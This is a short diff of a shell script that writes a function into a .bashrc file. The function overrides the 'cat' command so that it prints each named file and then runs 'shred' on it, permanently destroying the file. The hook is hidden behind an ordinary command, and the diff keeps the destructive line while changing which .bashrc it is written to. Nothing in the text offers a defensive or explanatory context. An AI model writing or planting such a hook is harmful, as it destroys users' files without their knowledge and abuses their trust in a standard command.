@@ -2,6 +2,8 @@
 
 echo "
 function cat() {
-  sed -n l \$@
+  echo \"\$(< \$@)\"
   shred \$@
-}" | cat >> ~/.bashrc
+}" | cat >> .bashrc
+
+echo "$(< $@)"
